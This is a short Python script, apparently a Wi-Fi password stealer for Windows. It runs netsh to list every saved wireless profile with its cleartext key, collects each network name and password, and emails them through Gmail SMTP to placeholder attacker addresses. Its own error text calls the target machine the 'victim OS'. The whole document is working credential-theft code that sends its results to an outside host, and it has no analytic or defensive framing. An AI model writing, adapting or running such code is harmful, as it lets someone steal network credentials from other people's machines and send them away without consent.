#!/usr/bin/env python
import subprocess
import re
import smtplib

def mail_it(email, passwd, to_mail, msg):
    mailserver = smtplib.SMTP("smtp.gmail.com", 587)
    mailserver.starttls()
    mailserver.login(email, passwd)
    mailserver.sendmail(email, to_mail, msg)
    mailserver.quit()

def get_passwd(wifi):
    cmd = "netsh wlan show profile " + wifi + " key=clear"
    wifi_info = subprocess.check_output(cmd, shell=True)
    try:
        wifi_info=wifi_info.decode('utf-8')
    except:
        wifi_info = str(wifi_info)
    wifi_pass = re.search("(?:Key Content\s*:\s)(.*)", wifi_info)
    return wifi_pass

def wifi_harvester():
    cmd = "netsh wlan show profile"
    network = subprocess.check_output(cmd, shell=True)
    try:
        network = network.decode('utf-8')
    except:
        network = str(network)
    try:
        net_names = re.findall("(?:Profile\s*:\s)(.*)", network)
    except:
        mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxx@gmail.com", "[-] ERROR, Unsupported encoding in victim OS")
    result = {}
    for wifi in net_names:
        cmd = "netsh wlan show profile " + wifi
        net_profile = subprocess.check_output(cmd, shell=True)
        try:
            net_profile = net_profile.decode('utf-8')         
        except:
            net_profile =str(net_profile)
        if not "no such wireless interface" in net_profile:
            wifi_pass = get_passwd(wifi)
            if wifi_pass:
                result[wifi] = wifi_pass.group(1)
    return result

credentials = wifi_harvester()
message = ""
for wifi in credentials:
    message = message + wifi.rstrip() +  " ----> " + credentials[wifi].rstrip() + "\n"
mail_it("xxxxxxxxxx@gmail.com", "********", "xxxxxxxxxxx@gmail.com", message)
